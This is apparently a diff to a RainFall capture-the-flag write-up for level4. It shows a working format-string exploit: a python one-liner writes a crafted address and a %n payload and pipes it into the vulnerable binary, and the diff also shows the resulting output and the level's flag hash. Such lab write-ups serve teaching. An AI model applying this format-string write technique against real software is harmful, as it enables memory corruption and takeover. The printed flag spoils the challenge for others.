@@ -55,9 +55,8 @@ Found on 12th position.
 ~~~shell
 level4@RainFall:~$ python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d%12$n"' > /tmp/flag4
 level4@RainFall:~$ cat /tmp/flag4 | ./level4
-[...]
-                                       -1208015184
+[... lots of stuff ...]
+ -1208015184
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ~~~
 
-~~~
